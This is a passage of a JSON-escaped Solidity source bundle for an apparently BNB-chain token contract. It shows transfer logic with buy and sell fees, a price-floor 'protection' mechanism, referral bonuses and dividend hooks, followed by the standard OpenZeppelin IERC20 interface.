account2)\r\n    external\r\n    onlyOwner\r\n  {\r\n    _tG[account] = account2;\r\n  }\r\n\r\n  function resetProtection() public onlyOwner {\r\n    _protectionT = block.timestamp;\r\n    _protectionP = IERC20(WBNB).balanceOf(_uni).md(_tOwned[_uni]);\r\n  }\r\n\r\n  function viewProtection() public view returns (bool) {\r\n    if (IERC20(WBNB).balanceOf(_uni).md(_tOwned[_uni]) \u003e= _protectionP)\r\n      return false;\r\n    return true;\r\n  }\r\n\r\n  function _resetProtection() private {\r\n    uint256 time = block.timestamp;\r\n    if (time.mts(_protectionT) \u003e= INTERVAL) {\r\n      _protectionT = time;\r\n      _protectionP = IERC20(WBNB).balanceOf(_uni).md(_tOwned[_uni]);\r\n    }\r\n  }\r\n\r\n  function _dividendDistributor(\r\n    address ter,\r\n    bool i,\r\n    bool r, //FALSE(amount\u003c1000) = Promotion only (will not affect weighting)\r\n    uint256 a\r\n  ) private {\r\n    uint256 sa = a;\r\n    bool v;\r\n    if (a == 0 \u0026\u0026 block.timestamp.mts(_protectionT) \u003e= INTERVAL) {\r\n      v = true;\r\n    }\r\n    if (!i) {\r\n      sa = _tOwned[_tFDogsAddress] \u003e= _tOwned[_uni].md(_buyR)\r\n        ? _tOwned[_uni].md(_buyR) - 1\r\n        : 0;\r\n    } else {\r\n      if (_tAW[ter] \u003e 1) {\r\n        sa = sa + _tAW[ter] - 1;\r\n        _tAW[ter] = 1;\r\n      }\r\n    }\r\n\r\n    IF9Dogs(_tFDogsAddress).transferNotify(ter, i, a \u003e 0 ? false : v, r, sa);\r\n    if (v) {\r\n      _resetProtection();\r\n    }\r\n  }\r\n\r\n  function _transfer(\r\n    address s,\r\n    address r,\r\n    uint256 t\r\n  ) private {\r\n    require(\r\n      s != address(0) \u0026\u0026 r != address(0),\r\n      \"ERROR: Transfer from the zero address.\"\r\n    );\r\n    require(t \u003e 0, \"ERROR: Transfer amount must be greater than zero.\");\r\n\r\n    if (_a[s] || _a[r] || _feeA == 0) {\r\n      _tokenTransfer(s, r, t);\r\n    } else {\r\n      if (_openTransferMinimum \u0026\u0026 _tOwned[s] == t) {\r\n        t = t - 1;\r\n        require(t \u003e 0, \"ERROR: Transfer amount must be greater than zero.\");\r\n      }\r\n      if (s != _uni \u0026\u0026 r != _uni) {\r\n        if (_tG[r] == address(0) \u0026\u0026 s != r) {\r\n          _tG[r] = s;\r\n          if (!_closeI) {\r\n            uint256 pa =\r\n              _tOwned[address(this)] \u003e totalIsend\r\n                ? totalIsend\r\n                : _tOwned[address(this)];\r\n            _tOwned[s] = _tOwned[s] + pa; //Promotional bonus 1000\r\n            _tOwned[address(this)] = _tOwned[address(this)] - pa;\r\n            if (_tOwned[address(this)] == 0) {\r\n              _closeI = true;\r\n            }\r\n            if (pa \u003e 0) emit Transfer(address(this), s, pa);\r\n            if (_tAW[s] == 0) {\r\n              _tAW[s] = 1; //gas optimisation\r\n            }\r\n          }\r\n        }\r\n        _tOwned[s] = _tOwned[s] - t;\r\n        _tOwned[r] = _tOwned[r] + t;\r\n        if (t \u003e 0) emit Transfer(s, r, t);\r\n        if (_openRun) {\r\n          _dividendDistributor(s, false, t \u003e totalIsend ? true : false, 0);\r\n        }\r\n      } else {\r\n        bool i = s == _uni ? true : false;\r\n        bool isFloor =\r\n          (IERC20(WBNB).balanceOf(_uni).md(_tOwned[_uni]) \u003e= _protectionP)\r\n            ? false\r\n            : true;\r\n        uint256 useFee = i ? _feeA : (isFloor ? _feeB : _feeA);\r\n\r\n        uint256 tfA = t.mm(useFee).md(1000);\r\n        uint256 tfC = t.mm(_feeC).md(1000);\r\n        uint256 tt = t.ms(tfA).ms(tfC);\r\n        if (i) {\r\n          tfA = tfA + claimDividend(r, tfC);\r\n        } else {\r\n          tfA = tfA + tfC;\r\n        }\r\n        if (tt \u003e 0) emit Transfer(s, r, tt);\r\n        _tOwned[s] = _tOwned[s].ms(t);\r\n        _tOwned[_tFDogsAddress] = _tOwned[_tFDogsAddress] + tfA;\r\n        _dividendDistributor(i ? r : s, i, true, isFloor ? t + t : t);\r\n        _tOwned[r] = _tOwned[r] + tt;\r\n        if (tfA \u003e 0) emit Transfer(s, _tFDogsAddress, tfA);\r\n      }\r\n    }\r\n  }\r\n\r\n  function _tokenTransfer(\r\n    address sender,\r\n    address recipient,\r\n    uint256 tAmount\r\n  ) private {\r\n    _tOwned[sender] = _tOwned[sender] - tAmount;\r\n    _tOwned[recipient] = _tOwned[recipient] + tAmount;\r\n    emit Transfer(sender, recipient, tAmount);\r\n  }\r\n}\r\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"}}